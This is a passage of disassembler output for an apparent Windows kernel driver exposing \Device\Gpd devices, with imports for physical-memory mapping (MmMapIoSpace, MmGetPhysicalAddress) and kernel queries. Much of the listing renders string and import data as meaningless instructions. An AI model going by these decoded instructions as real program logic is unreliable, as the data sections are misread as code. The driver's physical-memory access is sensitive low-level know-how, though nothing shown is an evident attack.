   13149:	8b 45 f8             	mov    -0x8(%ebp),%eax
   1314c:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
   13150:	50                   	push   %eax
   13151:	ff 75 f4             	push   -0xc(%ebp)
   13154:	8b c7                	mov    %edi,%eax
   13156:	ff 75 08             	push   0x8(%ebp)
   13159:	e8 1a ff ff ff       	call   0x13078
   1315e:	83 c4 0c             	add    $0xc,%esp
   13161:	eb e1                	jmp    0x13144
   13163:	cc                   	int3
   13164:	ff 25 38 34 01 00    	jmp    *0x13438
   1316a:	ff 25 3c 34 01 00    	jmp    *0x1343c
   13170:	ff 25 40 34 01 00    	jmp    *0x13440
   13176:	cc                   	int3
   13177:	cc                   	int3
   13178:	cc                   	int3
   13179:	cc                   	int3
   1317a:	cc                   	int3
   1317b:	cc                   	int3
   1317c:	cc                   	int3
   1317d:	cc                   	int3
   1317e:	cc                   	int3
   1317f:	cc                   	int3
   13180:	5c                   	pop    %esp
   13181:	00 53 00             	add    %dl,0x0(%ebx)
   13184:	79 00                	jns    0x13186
   13186:	73 00                	jae    0x13188
   13188:	74 00                	je     0x1318a
   1318a:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
   1318e:	52                   	push   %edx
   1318f:	00 6f 00             	add    %ch,0x0(%edi)
   13192:	6f                   	outsl  %ds:(%esi),(%dx)
   13193:	00 74 00 5c          	add    %dh,0x5c(%eax,%eax,1)
   13197:	00 53 00             	add    %dl,0x0(%ebx)
   1319a:	79 00                	jns    0x1319c
   1319c:	73 00                	jae    0x1319e
   1319e:	74 00                	je     0x131a0
   131a0:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
   131a4:	33 00                	xor    (%eax),%eax
   131a6:	32 00                	xor    (%eax),%al
   131a8:	5c                   	pop    %esp
   131a9:	00 68 00             	add    %ch,0x0(%eax)
   131ac:	61                   	popa
   131ad:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
   131b1:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
   131b5:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
   131b9:	00 cc                	add    %cl,%ah
   131bb:	cc                   	int3
   131bc:	cc                   	int3
   131bd:	cc                   	int3
   131be:	cc                   	int3
   131bf:	cc                   	int3
   131c0:	5c                   	pop    %esp
   131c1:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
   131c5:	00 76 00             	add    %dh,0x0(%esi)
   131c8:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
   131ce:	5c                   	pop    %esp
   131cf:	00 47 00             	add    %al,0x0(%edi)
   131d2:	70 00                	jo     0x131d4
   131d4:	64 00 31             	add    %dh,%fs:(%ecx)
   131d7:	00 00                	add    %al,(%eax)
   131d9:	00 cc                	add    %cl,%ah
   131db:	cc                   	int3
   131dc:	cc                   	int3
   131dd:	cc                   	int3
   131de:	cc                   	int3
   131df:	cc                   	int3
   131e0:	5c                   	pop    %esp
   131e1:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
   131e5:	00 76 00             	add    %dh,0x0(%esi)
   131e8:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
   131ee:	5c                   	pop    %esp
   131ef:	00 47 00             	add    %al,0x0(%edi)
   131f2:	70 00                	jo     0x131f4
   131f4:	64 00 30             	add    %dh,%fs:(%eax)
   131f7:	00 00                	add    %al,(%eax)
   131f9:	00 cc                	add    %cl,%ah
   131fb:	cc                   	int3
   131fc:	cc                   	int3
   131fd:	cc                   	int3
   131fe:	cc                   	int3
   131ff:	cc                   	int3
   13200:	5c                   	pop    %esp
   13201:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
   13205:	00 73 00             	add    %dh,0x0(%ebx)
   13208:	44                   	inc    %esp
   13209:	00 65 00             	add    %ah,0x0(%ebp)
   1320c:	76 00                	jbe    0x1320e
   1320e:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
   13214:	73 00                	jae    0x13216
   13216:	5c                   	pop    %esp
   13217:	00 47 00             	add    %al,0x0(%edi)
   1321a:	70 00                	jo     0x1321c
   1321c:	64 00 44 00 65       	add    %al,%fs:0x65(%eax,%eax,1)
   13221:	00 76 00             	add    %dh,0x0(%esi)
   13224:	00 00                	add    %al,(%eax)
   13226:	cc                   	int3
   13227:	cc                   	int3
   13228:	cc                   	int3
   13229:	cc                   	int3
   1322a:	cc                   	int3
   1322b:	cc                   	int3
   1322c:	cc                   	int3
   1322d:	cc                   	int3
   1322e:	cc                   	int3
   1322f:	cc                   	int3
   13230:	4b                   	dec    %ebx
   13231:	00 45 00             	add    %al,0x0(%ebp)
   13234:	52                   	push   %edx
   13235:	00 4e 00             	add    %cl,0x0(%esi)
   13238:	45                   	inc    %ebp
   13239:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
   1323d:	00 32                	add    %dh,(%edx)
   1323f:	00 2e                	add    %ch,(%esi)
   13241:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
   13245:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
   13249:	00 cc                	add    %cl,%ah
   1324b:	cc                   	int3
   1324c:	cc                   	int3
   1324d:	cc                   	int3
   1324e:	cc                   	int3
   1324f:	cc                   	int3
   13250:	5a                   	pop    %edx
   13251:	00 77 00             	add    %dh,0x0(%edi)
   13254:	51                   	push   %ecx
   13255:	00 75 00             	add    %dh,0x0(%ebp)
   13258:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
   1325c:	79 00                	jns    0x1325e
   1325e:	53                   	push   %ebx
   1325f:	00 79 00             	add    %bh,0x0(%ecx)
   13262:	73 00                	jae    0x13264
   13264:	74 00                	je     0x13266
   13266:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
   1326a:	49                   	dec    %ecx
   1326b:	00 6e 00             	add    %ch,0x0(%esi)
   1326e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
   13272:	72 00                	jb     0x13274
   13274:	6d                   	insl   (%dx),%es:(%edi)
   13275:	00 61 00             	add    %ah,0x0(%ecx)
   13278:	74 00                	je     0x1327a
   1327a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
   13280:	00 00                	add    %al,(%eax)
   13282:	cc                   	int3
   13283:	cc                   	int3
   13284:	cc                   	int3
   13285:	cc                   	int3
   13286:	cc                   	int3
   13287:	cc                   	int3
   13288:	cc                   	int3
   13289:	cc                   	int3
   1328a:	cc                   	int3
   1328b:	cc                   	int3
   1328c:	cc                   	int3
   1328d:	cc                   	int3
   1328e:	cc                   	int3
   1328f:	cc                   	int3
   13290:	6e                   	outsb  %ds:(%esi),(%dx)
   13291:	74 6f                	je     0x13302
   13293:	73 6b                	jae    0x13300
   13295:	72 6e                	jb     0x13305
   13297:	6c                   	insb   (%dx),%es:(%edi)
   13298:	2e 65 78 65          	cs js,pn 0x13301
   1329c:	00 cc                	add    %cl,%ah
   1329e:	cc                   	int3
   1329f:	cc                   	int3
   132a0:	6e                   	outsb  %ds:(%esi),(%dx)
   132a1:	74 6b                	je     0x1330e
   132a3:	72 6e                	jb     0x13313
   132a5:	6c                   	insb   (%dx),%es:(%edi)
   132a6:	70 61                	jo     0x13309
   132a8:	2e 65 78 65          	cs js,pn 0x13311
   132ac:	00 cc                	add    %cl,%ah
   132ae:	cc                   	int3
   132af:	cc                   	int3
   132b0:	c3                   	ret
   132b1:	cc                   	int3
   132b2:	cc                   	int3
   132b3:	cc                   	int3
   132b4:	cc                   	int3
   132b5:	cc                   	int3
   132b6:	cc                   	int3
   132b7:	cc                   	int3
   132b8:	cc                   	int3
   132b9:	cc                   	int3
   132ba:	cc                   	int3
   132bb:	cc                   	int3
   132bc:	cc                   	int3
   132bd:	cc                   	int3
   132be:	cc                   	int3
   132bf:	cc                   	int3
   132c0:	c3                   	ret
   132c1:	cc                   	int3
   132c2:	cc                   	int3
   132c3:	cc                   	int3
   132c4:	cc                   	int3
   132c5:	cc                   	int3
   132c6:	cc                   	int3
   132c7:	cc                   	int3
   132c8:	cc                   	int3
   132c9:	cc                   	int3
   132ca:	cc                   	int3
   132cb:	cc                   	int3
   132cc:	cc                   	int3
   132cd:	cc                   	int3
   132ce:	cc                   	int3
   132cf:	cc                   	int3
   132d0:	80 3d b4 53 01 00 00 	cmpb   $0x0,0x153b4
   132d7:	74 2c                	je     0x13305
   132d9:	a1 b8 53 01 00       	mov    0x153b8,%eax
   132de:	85 c0                	test   %eax,%eax
   132e0:	57                   	push   %edi
   132e1:	c6 05 b4 53 01 00 00 	movb   $0x0,0x153b4
   132e8:	8b f8                	mov    %eax,%edi
   132ea:	74 18                	je     0x13304
   132ec:	8b 00                	mov    (%eax),%eax
   132ee:	85 c0                	test   %eax,%eax
   132f0:	56                   	push   %esi
   132f1:	8b 35 f8 33 01 00    	mov    0x133f8,%esi
   132f7:	74 05                	je     0x132fe
   132f9:	6a 00                	push   $0x0
   132fb:	50                   	push   %eax
   132fc:	ff d6                	call   *%esi
   132fe:	6a 00                	push   $0x0
   13300:	57                   	push   %edi
   13301:	ff d6                	call   *%esi
   13303:	5e                   	pop    %esi
   13304:	5f                   	pop    %edi
   13305:	c3                   	ret
   13306:	cc                   	int3
   13307:	cc                   	int3
   13308:	cc                   	int3
   13309:	cc                   	int3
   1330a:	cc                   	int3
   1330b:	cc                   	int3
   1330c:	cc                   	int3
   1330d:	cc                   	int3
   1330e:	cc                   	int3
   1330f:	cc                   	int3
   13310:	c3                   	ret

Disassembly of section INIT:

00015400 <INIT>:
   15400:	4c                   	dec    %esp
   15401:	54                   	push   %esp
	...
   1540a:	00 00                	add    %al,(%eax)
   1540c:	90                   	nop
   1540d:	57                   	push   %edi
   1540e:	00 00                	add    %al,(%eax)
   15410:	90                   	nop
   15411:	33 00                	xor    (%eax),%eax
   15413:	00 3c 54             	add    %bh,(%esp,%edx,2)
	...
   1541e:	00 00                	add    %al,(%eax)
   15420:	da 57 00             	ficoml 0x0(%edi)
   15423:	00 80 33 00 00 00    	add    %al,0x33(%eax)
	...
   15439:	00 00                	add    %al,(%eax)
   1543b:	00 b2 57 00 00 9e    	add    %dh,-0x61ffffa9(%edx)
   15441:	57                   	push   %edi
   15442:	00 00                	add    %al,(%eax)
   15444:	c6                   	(bad)
   15445:	57                   	push   %edi
   15446:	00 00                	add    %al,(%eax)
   15448:	00 00                	add    %al,(%eax)
   1544a:	00 00                	add    %al,(%eax)
   1544c:	6c                   	insb   (%dx),%es:(%edi)
   1544d:	55                   	push   %ebp
   1544e:	00 00                	add    %al,(%eax)
   15450:	7e 55                	jle    0x154a7
   15452:	00 00                	add    %al,(%eax)
   15454:	90                   	nop
   15455:	55                   	push   %ebp
   15456:	00 00                	add    %al,(%eax)
   15458:	a2 55 00 00 ba       	mov    %al,0xba000055
   1545d:	55                   	push   %ebp
   1545e:	00 00                	add    %al,(%eax)
   15460:	cc                   	int3
   15461:	55                   	push   %ebp
   15462:	00 00                	add    %al,(%eax)
   15464:	e2 55                	loop   0x154bb
   15466:	00 00                	add    %al,(%eax)
   15468:	f2 55                	repnz push %ebp
   1546a:	00 00                	add    %al,(%eax)
   1546c:	10 56 00             	adc    %dl,0x0(%esi)
   1546f:	00 28                	add    %ch,(%eax)
   15471:	56                   	push   %esi
   15472:	00 00                	add    %al,(%eax)
   15474:	44                   	inc    %esp
   15475:	56                   	push   %esi
   15476:	00 00                	add    %al,(%eax)
   15478:	56                   	push   %esi
   15479:	56                   	push   %esi
   1547a:	00 00                	add    %al,(%eax)
   1547c:	54                   	push   %esp
   1547d:	55                   	push   %ebp
   1547e:	00 00                	add    %al,(%eax)
   15480:	76 56                	jbe    0x154d8
   15482:	00 00                	add    %al,(%eax)
   15484:	80 56 00 00          	adcb   $0x0,0x0(%esi)
   15488:	8e 56 00             	mov    0x0(%esi),%ss
   1548b:	00 a8 56 00 00 bc    	add    %ch,-0x43ffffaa(%eax)
   15491:	56                   	push   %esi
   15492:	00 00                	add    %al,(%eax)
   15494:	d0 56 00             	rclb   $1,0x0(%esi)
   15497:	00 e6                	add    %ah,%dh
   15499:	56                   	push   %esi
   1549a:	00 00                	add    %al,(%eax)
   1549c:	06                   	push   %es
   1549d:	57                   	push   %edi
   1549e:	00 00                	add    %al,(%eax)
   154a0:	1c 57                	sbb    $0x57,%al
   154a2:	00 00                	add    %al,(%eax)
   154a4:	3c 57                	cmp    $0x57,%al
   154a6:	00 00                	add    %al,(%eax)
   154a8:	58                   	pop    %eax
   154a9:	57                   	push   %edi
   154aa:	00 00                	add    %al,(%eax)
   154ac:	78 57                	js     0x15505
   154ae:	00 00                	add    %al,(%eax)
   154b0:	30 55 00             	xor    %dl,0x0(%ebp)
   154b3:	00 1c 55 00 00 68 56 	add    %bl,0x56680000(,%edx,2)
   154ba:	00 00                	add    %al,(%eax)
   154bc:	04 55                	add    $0x55,%al
   154be:	00 00                	add    %al,(%eax)
   154c0:	e2 57                	loop   0x15519
   154c2:	00 00                	add    %al,(%eax)
   154c4:	fc                   	cld
   154c5:	57                   	push   %edi
   154c6:	00 00                	add    %al,(%eax)
   154c8:	10 58 00             	adc    %bl,0x0(%eax)
   154cb:	00 22                	add    %ah,(%edx)
   154cd:	58                   	pop    %eax
   154ce:	00 00                	add    %al,(%eax)
   154d0:	3a 58 00             	cmp    0x0(%eax),%bl
   154d3:	00 4c 58 00          	add    %cl,0x0(%eax,%ebx,2)
   154d7:	00 58 58             	add    %bl,0x58(%eax)
   154da:	00 00                	add    %al,(%eax)
   154dc:	64 58                	fs pop %eax
   154de:	00 00                	add    %al,(%eax)
   154e0:	80 58 00 00          	sbbb   $0x0,0x0(%eax)
   154e4:	90                   	nop
   154e5:	58                   	pop    %eax
   154e6:	00 00                	add    %al,(%eax)
   154e8:	ac                   	lods   %ds:(%esi),%al
   154e9:	58                   	pop    %eax
   154ea:	00 00                	add    %al,(%eax)
   154ec:	c4 58 00             	les    0x0(%eax),%ebx
   154ef:	00 e2                	add    %ah,%dl
   154f1:	58                   	pop    %eax
   154f2:	00 00                	add    %al,(%eax)
   154f4:	fa                   	cli
   154f5:	58                   	pop    %eax
   154f6:	00 00                	add    %al,(%eax)
   154f8:	04 59                	add    $0x59,%al
   154fa:	00 00                	add    %al,(%eax)
   154fc:	18 59 00             	sbb    %bl,0x0(%ecx)
   154ff:	00 00                	add    %al,(%eax)
   15501:	00 00                	add    %al,(%eax)
   15503:	00 27                	add    %ah,(%edi)
   15505:	01 49 6f             	add    %ecx,0x6f(%ecx)
   15508:	44                   	inc    %esp
   15509:	65 6c                	gs insb (%dx),%es:(%edi)
   1550b:	65 74 65             	gs je  0x15573
   1550e:	53                   	push   %ebx
   1550f:	79 6d                	jns    0x1557e
   15511:	62 6f 6c             	bound  %ebp,0x6c(%edi)
   15514:	69 63 4c 69 6e 6b 00 	imul   $0x6b6e69,0x4c(%ebx),%esp
   1551b:	00 48 00             	add    %cl,0x0(%eax)
   1551e:	45                   	inc    %ebp
   1551f:	78 46                	js     0x15567
   15521:	72 65                	jb     0x15588
   15523:	65 50                	gs push %eax
   15525:	6f                   	outsl  %ds:(%esi),(%dx)
   15526:	6f                   	outsl  %ds:(%esi),(%dx)
   15527:	6c                   	insb   (%dx),%es:(%edi)
   15528:	57                   	push   %edi
   15529:	69 74 68 54 61 67 00 	imul   $0x64006761,0x54(%eax,%ebp,2),%esi
   15530:	64 
   15531:	01 49 6f             	add    %ecx,0x6f(%ecx)
   15534:	52                   	push   %edx
   15535:	65 67 69 73 74 65 72 	imul   $0x72447265,%gs:0x74(%bp,%di),%esi
   1553c:	44 72 
   1553e:	69 76 65 72 52 65 69 	imul   $0x69655272,0x65(%esi),%esi
   15545:	6e                   	outsb  %ds:(%esi),(%dx)
   15546:	69 74 69 61 6c 69 7a 	imul   $0x617a696c,0x61(%ecx,%ebp,2),%esi
   1554d:	61 
   1554e:	74 69                	je     0x155b9
   15550:	6f                   	outsl  %ds:(%esi),(%dx)
   15551:	6e                   	outsb  %ds:(%esi),(%dx)
   15552:	00 00                	add    %al,(%eax)
   15554:	68 03 52 74 6c       	push   $0x6c745203
   15559:	49                   	dec    %ecx
   1555a:	6e                   	outsb  %ds:(%esi),(%dx)
   1555b:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%ebp,%edx,2),%esi
   15562:	64 
   15563:	65 53                	gs push %ebx
   15565:	74 72                	je     0x155d9
   15567:	69 6e 67 00 00 25 01 	imul   $0x1250000,0x67(%esi),%ebp
   1556e:	49                   	dec    %ecx
   1556f:	6f                   	outsl  %ds:(%esi),(%dx)
   15570:	44                   	inc    %esp
   15571:	65 6c                	gs insb (%dx),%es:(%edi)
   15573:	65 74 65             	gs je  0x155db
   15576:	44                   	inc    %esp
   15577:	65 76 69             	gs jbe 0x155e3
   1557a:	63 65 00             	arpl   %esp,0x0(%ebp)
   1557d:	00 34 01             	add    %dh,(%ecx,%eax,1)
   15580:	49                   	dec    %ecx
   15581:	6f                   	outsl  %ds:(%esi),(%dx)
   15582:	46                   	inc    %esi
   15583:	72 65                	jb     0x155ea
   15585:	65 57                	gs push %edi
   15587:	6f                   	outsl  %ds:(%esi),(%dx)
   15588:	72 6b                	jb     0x155f5
   1558a:	49                   	dec    %ecx
   1558b:	74 65                	je     0x155f2
   1558d:	6d                   	insl   (%dx),%es:(%edi)
   1558e:	00 00                	add    %al,(%eax)
   15590:	68 02 4d 6d 55       	push   $0x556d4d02
   15595:	6e                   	outsb  %ds:(%esi),(%dx)
   15596:	6d                   	insl   (%dx),%es:(%edi)
   15597:	61                   	popa
   15598:	70 49                	jo     0x155e3
   1559a:	6f                   	outsl  %ds:(%esi),(%dx)
   1559b:	53                   	push   %ebx
   1559c:	70 61                	jo     0x155ff
   1559e:	63 65 00             	arpl   %esp,0x0(%ebp)
   155a1:	00 41 02             	add    %al,0x2(%ecx)
   155a4:	4d                   	dec    %ebp
   155a5:	6d                   	insl   (%dx),%es:(%edi)
   155a6:	47                   	inc    %edi
   155a7:	65 74 50             	gs je  0x155fa
   155aa:	68 79 73 69 63       	push   $0x63697379
   155af:	61                   	popa
   155b0:	6c                   	insb   (%dx),%es:(%edi)
   155b1:	41                   	inc    %ecx
   155b2:	64 64 72 65          	fs fs jb 0x1561b
   155b6:	73 73                	jae    0x1562b
   155b8:	00 00                	add    %al,(%eax)
   155ba:	37                   	aaa
   155bb:	00 45 78             	add    %al,0x78(%ebp)
   155be:	41                   	inc    %ecx
   155bf:	6c                   	insb   (%dx),%es:(%edi)
   155c0:	6c                   	insb   (%dx),%es:(%edi)
   155c1:	6f                   	outsl  %ds:(%esi),(%dx)
   155c2:	63 61 74             	arpl   %esp,0x74(%ecx)
   155c5:	65 50                	gs push %eax
   155c7:	6f                   	outsl  %ds:(%esi),(%dx)
   155c8:	6f                   	outsl  %ds:(%esi),(%dx)
   155c9:	6c                   	insb   (%dx),%es:(%edi)
   155ca:	00 00                	add    %al,(%eax)
   155cc:	05 01 49 6f 41       	add    $0x416f4901,%eax
   155d1:	6c                   	insb   (%dx),%es:(%edi)
   155d2:	6c                   	insb   (%dx),%es:(%edi)
   155d3:	6f                   	outsl  %ds:(%esi),(%dx)
   155d4:	63 61 74             	arpl   %esp,0x74(%ecx)
   155d7:	65 57                	gs push %edi
   155d9:	6f                   	outsl  %ds:(%esi),(%dx)
   155da:	72 6b                	jb     0x15647
   155dc:	49                   	dec    %ecx
   155dd:	74 65                	je     0x15644
   155df:	6d                   	insl   (%dx),%es:(%edi)
   155e0:	00 00                	add    %al,(%eax)
   155e2:	4f                   	dec    %edi
   155e3:	02 4d 6d             	add    0x6d(%ebp),%cl
   155e6:	4d                   	dec    %ebp
   155e7:	61                   	popa
   155e8:	70 49                	jo     0x15633
   155ea:	6f                   	outsl  %ds:(%esi),(%dx)
   155eb:	53                   	push   %ebx
   155ec:	70 61                	jo     0x1564f
   155ee:	63 65 00             	arpl   %esp,0x0(%ebp)
   155f1:	00 09                	add    %cl,(%ecx)
   155f3:	01 49 6f             	add    %ecx,0x6f(%ecx)
   155f6:	41                   	inc    %ecx
   155f7:	74 74                	je     0x1566d
   155f9:	61                   	popa
   155fa:	63 68 44             	arpl   %ebp,0x44(%eax)
   155fd:	65 76 69             	gs jbe 0x15669
   15600:	63 65 54             	arpl   %esp,0x54(%ebp)
   15603:	6f                   	outsl  %ds:(%esi),(%dx)
   15604:	44                   	inc    %esp
   15605:	65 76 69             	gs jbe 0x15671
   15608:	63 65 53             	arpl   %esp,0x53(%ebp)
   1560b:	74 61                	je     0x1566e
   1560d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
   15610:	21 01                	and    %eax,(%ecx)
   15612:	49                   	dec    %ecx
   15613:	6f                   	outsl  %ds:(%esi),(%dx)
   15614:	43                   	inc    %ebx
   15615:	72 65                	jb     0x1567c
   15617:	61                   	popa
   15618:	74 65                	je     0x1567f
   1561a:	53                   	push   %ebx
   1561b:	79 6d                	jns    0x1568a
   1561d:	62 6f 6c             	bound  %ebp,0x6c(%edi)
   15620:	69 63 4c 69 6e 6b 00 	imul   $0x6b6e69,0x4c(%ebx),%esp
   15627:	00 4b 01             	add    %cl,0x1(%ebx)
   1562a:	49                   	dec    %ecx
   1562b:	6f                   	outsl  %ds:(%esi),(%dx)
   1562c:	49                   	dec    %ecx
   1562d:	6e                   	outsb  %ds:(%esi),(%dx)
   1562e:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
   15635:	65 
   15636:	52                   	push   %edx
   15637:	65 6d                	gs insl (%dx),%es:(%edi)
   15639:	6f                   	outsl  %ds:(%esi),(%dx)
   1563a:	76 65                	jbe    0x156a1
   1563c:	4c                   	dec    %esp
   1563d:	6f                   	outsl  %ds:(%esi),(%dx)
   1563e:	63 6b 45             	arpl   %ebp,0x45(%ebx)
   15641:	78 00                	js     0x15643
   15643:	00 1b                	add    %bl,(%ebx)
   15645:	01 49 6f             	add    %ecx,0x6f(%ecx)
   15648:	43                   	inc    %ebx
   15649:	72 65                	jb     0x156b0
   1564b:	61                   	popa
   1564c:	74 65                	je     0x156b3
   1564e:	44                   	inc    %esp
   1564f:	65 76 69             	gs jbe 0x156bb
   15652:	63 65 00             	arpl   %esp,0x0(%ebp)
   15655:	00 5d 01             	add    %bl,0x1(%ebp)
   15658:	49                   	dec    %ecx
   15659:	6f                   	outsl  %ds:(%esi),(%dx)
   1565a:	51                   	push   %ecx
   1565b:	75 65                	jne    0x156c2
   1565d:	75 65                	jne    0x156c4
   1565f:	57                   	push   %edi
   15660:	6f                   	outsl  %ds:(%esi),(%dx)
   15661:	72 6b                	jb     0x156ce
   15663:	49                   	dec    %ecx
   15664:	74 65                	je     0x156cb
   15666:	6d                   	insl   (%dx),%es:(%edi)
   15667:	00 5b 04             	add    %bl,0x4(%ebx)
   1566a:	5a                   	pop    %edx
   1566b:	77 52                	ja     0x156bf
   1566d:	65 61                	gs popa
   1566f:	64 46                	fs inc %esi
   15671:	69 6c 65 00 00 1f 04 	imul   $0x5a041f00,0x0(%ebp,%eiz,2),%ebp
   15678:	5a 
   15679:	77 43                	ja     0x156be
   1567b:	6c                   	insb   (%dx),%es:(%edi)
   1567c:	6f                   	outsl  %ds:(%esi),(%dx)
   1567d:	73 65                	jae    0x156e4
   1567f:	00 3f                	add    %bh,(%edi)
   15681:	04 5a                	add    $0x5a,%al
   15683:	77 4f                	ja     0x156d4
   15685:	70 65                	jo     0x156ec
   15687:	6e                   	outsb  %ds:(%esi),(%dx)
   15688:	46                   	inc    %esi
   15689:	69 6c 65 00 00 4f 04 	imul   $0x5a044f00,0x0(%ebp,%eiz,2),%ebp
   15690:	5a 
   15691:	77 51                	ja     0x156e4
   15693:	75 65                	jne    0x156fa
   15695:	72 79                	jb     0x15710
   15697:	49                   	dec    %ecx
   15698:	6e                   	outsb  %ds:(%esi),(%dx)
   15699:	66 6f                	outsw  %ds:(%esi),(%dx)
   1569b:	72 6d                	jb     0x1570a
   1569d:	61                   	popa
   1569e:	74 69                	je     0x15709
   156a0:	6f                   	outsl  %ds:(%esi),(%dx)
   156a1:	6e                   	outsb  %ds:(%esi),(%dx)
   156a2:	46                   	inc    %esi
   156a3:	69 6c 65 00 00 98 01 	imul   $0x4b019800,0x0(%ebp,%eiz,2),%ebp
   156aa:	4b 
   156ab:	64 44                	fs inc %esp
   156ad:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
   156b1:	67 65 72 45          	addr16 gs jb 0x156fa
   156b5:	6e                   	outsb  %ds:(%esi),(%dx)
   156b6:	61                   	popa
   156b7:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
   156bb:	00 f5                	add    %dh,%ch
   156bd:	00 49 6e             	add    %cl,0x6e(%ecx)
   156c0:	69 74 53 61 66 65 42 	imul   $0x6f426566,0x61(%ebx,%edx,2),%esi
   156c7:	6f 
   156c8:	6f                   	outsl  %ds:(%esi),(%dx)
   156c9:	74 4d                	je     0x15718
   156cb:	6f                   	outsl  %ds:(%esi),(%dx)
   156cc:	64 65 00 00          	fs add %al,%gs:(%eax)
   156d0:	97                   	xchg   %eax,%edi
   156d1:	01 49 6f             	add    %ecx,0x6f(%ecx)
   156d4:	66 43                	inc    %bx
   156d6:	6f                   	outsl  %ds:(%esi),(%dx)
   156d7:	6d                   	insl   (%dx),%es:(%edi)
   156d8:	70 6c                	jo     0x15746
   156da:	65 74 65             	gs je  0x15742
   156dd:	52                   	push   %edx
   156de:	65 71 75             	gs jno 0x15756
   156e1:	65 73 74             	gs jae 0x15758
   156e4:	00 00                	add    %al,(%eax)
   156e6:	29 03                	sub    %eax,(%ebx)
   156e8:	52                   	push   %edx
   156e9:	74 6c                	je     0x15757
   156eb:	44                   	inc    %esp
   156ec:	65 6c                	gs insb (%dx),%es:(%edi)
   156ee:	65 74 65             	gs je  0x15756
   156f1:	45                   	inc    %ebp
   156f2:	6c                   	insb   (%dx),%es:(%edi)
   156f3:	65 6d                	gs insl (%dx),%es:(%edi)
   156f5:	65 6e                	outsb  %gs:(%esi),(%dx)
   156f7:	74 47                	je     0x15740
   156f9:	65 6e                	outsb  %gs:(%esi),(%dx)
   156fb:	65 72 69             	gs jb  0x15767
   156fe:	63 54 61 62          	arpl   %edx,0x62(%ecx,%eiz,2)
   15702:	6c                   	insb   (%dx),%es:(%edi)
   15703:	65 00 00             	add    %al,%gs:(%eax)
   15706:	b4 01                	mov    $0x1,%ah
   15708:	4b                   	dec    %ebx
   15709:	65 47                	gs inc %edi
   1570b:	65 74 43             	gs je  0x15751
   1570e:	75 72                	jne    0x15782
   15710:	72 65                	jb     0x15777
   15712:	6e                   	outsb  %ds:(%esi),(%dx)
   15713:	74 54                	je     0x15769
   15715:	68 72 65 61 64       	push   $0x64616572
   1571a:	00 00                	add    %al,(%eax)
   1571c:	83 03 52             	addl   $0x52,(%ebx)
   1571f:	74 6c                	je     0x1578d
   15721:	4c                   	dec    %esp
   15722:	6f                   	outsl  %ds:(%esi),(%dx)
   15723:	6f                   	outsl  %ds:(%esi),(%dx)
   15724:	6b 75 70 45          	imul   $0x45,0x70(%ebp),%esi
   15728:	6c                   	insb   (%dx),%es:(%edi)
   15729:	65 6d                	gs insl (%dx),%es:(%edi)
   1572b:	65 6e                	outsb  %gs:(%esi),(%dx)
   1572d:	74 47                	je     0x15776
   1572f:	65 6e                	outsb  %gs:(%esi),(%dx)
   15731:	65 72 69             	gs jb  0x1579d
   15734:	63 54 61 62          	arpl   %edx,0x62(%ecx,%eiz,2)
   15738:	6c                   	insb   (%dx),%es:(%edi)
   15739:	65 00 00             	add    %al,%gs:(%eax)
   1573c:	6a 03                	push   $0x3
   1573e:	52                   	push   %edx
   1573f:	74 6c                	je     0x157ad
   15741:	49                   	dec    %ecx
   15742:	6e                   	outsb  %ds:(%esi),(%dx)
   15743:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
   1574a:	65 
   1574b:	47                   	inc    %edi
   1574c:	65 6e                	outsb  %gs:(%esi),(%dx)
   1574e:	65 72 69             	gs jb  0x157ba
   15751:	63 54 61 62          	arpl   %edx,0x62(%ecx,%eiz,2)
   15755:	6c                   	insb   (%dx),%es:(%edi)
   15756:	65 00 6e 03          	add    %ch,%gs:0x3(%esi)
   1575a:	52                   	push   %edx
   1575b:	74 6c                	je     0x157c9
   1575d:	49                   	dec    %ecx
   1575e:	6e                   	outsb  %ds:(%esi),(%dx)
   1575f:	73 65                	jae    0x157c6
   15761:	72 74                	jb     0x157d7
   15763:	45                   	inc    %ebp
   15764:	6c                   	insb   (%dx),%es:(%edi)
   15765:	65 6d                	gs insl (%dx),%es:(%edi)
   15767:	65 6e                	outsb  %gs:(%esi),(%dx)
   15769:	74 47                	je     0x157b2
   1576b:	65 6e                	outsb  %gs:(%esi),(%dx)
   1576d:	65 72 69             	gs jb  0x157d9
   15770:	63 54 61 62          	arpl   %edx,0x62(%ecx,%eiz,2)
   15774:	6c                   	insb   (%dx),%es:(%edi)
   15775:	65 00 00             	add    %al,%gs:(%eax)
   15778:	cc                   	int3
   15779:	03 52 74             	add    0x74(%edx),%edx
   1577c:	6c                   	insb   (%dx),%es:(%edi)
   1577d:	55                   	push   %ebp
   1577e:	70 63                	jo     0x157e3
   15780:	61                   	popa
   15781:	73 65                	jae    0x157e8
   15783:	55                   	push   %ebp
   15784:	6e                   	outsb  %ds:(%esi),(%dx)
   15785:	69 63 6f 64 65 43 68 	imul   $0x68436564,0x6f(%ebx),%esp
   1578c:	61                   	popa
   1578d:	72 00                	jb     0x1578f
   1578f:	00 6e 74             	add    %ch,0x74(%esi)
   15792:	6f                   	outsl  %ds:(%esi),(%dx)
   15793:	73 6b                	jae    0x15800
   15795:	72 6e                	jb     0x15805
